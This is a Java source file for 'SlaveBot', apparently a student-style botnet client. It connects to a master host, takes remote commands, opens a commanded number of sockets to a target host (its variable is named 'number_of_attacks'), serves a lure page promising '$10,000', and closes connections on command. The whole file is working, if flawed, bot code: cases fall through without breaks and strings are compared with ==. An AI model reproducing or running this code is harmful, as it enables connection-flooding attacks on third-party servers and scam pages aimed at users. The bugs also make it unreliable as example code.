

import java.io.*;
import java.net.*;
import java.util.*;

class SC
{
    private String host_name;
    private Socket sock;
    private int portNo;
   
    


	public SC(String host_name, int portNo, Socket sock)
    	{
    	    this.host_name = host_name;
    	    this.portNo = portNo;
    	    this.sock = sock;
    	}

	public void setPortNumber(int portNo)
	{
        	this.portNo = portNo;
    	}

	public void setSocket(Socket sock)
	{
		this.sock = sock;
	}

	public void setHostname(String host_name)
	{
		this.host_name = host_name;
	}
   


	public int getPortNumber()
	{
		return portNo;
	}

	public Socket getSocket()
	{
		return sock;
	}

	public String getHostname()
	{
		return host_name;
	}
   
    
}

public class SlaveBot
{
ServerSocket serverSocket;
    public static void main(String[] args) throws IOException
    {
    	int portNo = 0;
 
	String addr="127.0.0.1";

        if(args.length == 4)
        {
        	for (int i = 0; i < args.length; i++)
        	{
        		if(args[i].equals("-p"))
        		{
        			portNo = Integer.parseInt(args[i+1]);

        		}
        		else if(args[i].equals("-h"))
        		{
        			addr=args[i+1];
        		}
        	}
        }
        
       
        String cmd;
	Socket sock = null;	
	int sport;
	ArrayList<SC> server_info = new ArrayList<SC>();		
	try
        {
		sock = new Socket(addr, portNo);  
		BufferedReader br= new BufferedReader(new InputStreamReader(sock.getInputStream()));
		String host_ip;
                
		int number_of_attacks;
	while (true)
            {
		 cmd = br.readLine();
		 if (cmd == null)
	             continue;         

		String splitcmd[] = cmd.split(" ");

                switch (splitcmd[0])
                {
                case "connect":
                	host_ip = splitcmd[2];
                    sport = Integer.parseInt(splitcmd[3]);
                    number_of_attacks = Integer.parseInt(splitcmd[4]);
                    for (int i = 0; i < number_of_attacks; i++)
                    {
                        Socket new_sock = new Socket(host_ip, sport);
                        SC conn = new SC(host_ip, sport, new_sock);
                        server_info.add(conn);
                    }
					
                    
case "rise-fake-url":
				
					if(splitcmd.length == 2)
					{
																sport = Integer.parseInt(splitcmd[1]);
						
					
						new SlaveBot().runServer(sport);
					}
					else
					{
						//System.exit(1);
					}
			                
            
                case "disconnect":
		if(splitcmd[1].equals("localhost")||splitcmd[1].equals("127.0.0.1")||splitcmd[1].equals("all"))
		{
                	host_ip = splitcmd[2];

		        ArrayList<SC> CR = new ArrayList<SC>();
                    
		if(splitcmd.length == 3)
                    {
                        for(SC SC : server_info)
                        {
                            if(host_ip == SC.getHostname())
                            {
                            	SC.getSocket().close();
				
                                CR.add(SC);                                
                            }
                        }
			
                        for(SC SC : CR)
                        {
                        	server_info.remove(SC);
                        }
                    }
                    else if(splitcmd.length==4)
                    {
                        sport = Integer.parseInt(splitcmd[3]);

                        for(SC SC : server_info)
                        {
                            if(host_ip == SC.getHostname() && sport == SC.getPortNumber())
                            {
                            	SC.getSocket().close();
                            	CR.add(SC);                            	
                            }
                        }
			
                        for(SC SC : CR)
                        {
                        	server_info.remove(SC);
                        }
                    }
					else
					{
					//	System.exit(-1);
					}
					}
					else
					{
					//	System.exit(-1);
					}
                    continue;

                default:
                    continue;
                }
            }
        }
        catch (IOException e)
        {
            e.printStackTrace();
            sock.close();
        } catch (Exception e) {
			
			e.printStackTrace();
		}
    }
	public void runServer(int sport) throws Exception {
    	serverSocket = new ServerSocket(sport);
    	
    	
    	Socket s = serverSocket.accept();
    	
    	
    	
    	if(s != null)
    		System.out.println("\nCreated a web server");
    	
    	
    	PrintWriter pout = new PrintWriter(s.getOutputStream());
    	
    	pout.println("HTTP/1.1 200 OK");
    	pout.println("Content-Type: text/html");
        pout.println("\r\n");
        pout.println("<h2> Welcome to web servers </h2>");
        pout.println("<a>Click here to win $10,000</a>");
        pout.println("<a>Check here!</a>");
        pout.flush();
        
        pout.close();
        s.close();
        serverSocket.close();
    	
        
    }
	public static String rgen()
	{
		String str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		Random ran = new Random();
		int num = ran.nextInt(10) + 1;
		String ran_str = "";
		int i =0; 
		while(i < num)
		{
			char ch = str.charAt(ran.nextInt(52));
			ran_str = ran_str + ch;
			i++;
		}
		
		return ran_str;
	}
	public static void response(URL url)throws IOException
	{		
			try{
			Scanner scan = new Scanner(url.openStream());
			while(scan.hasNext())
			{
				scan.nextLine();
			}
			scan.close();
		}catch(IOException e){
			//System.exit(-1);
		}
	}
	
}





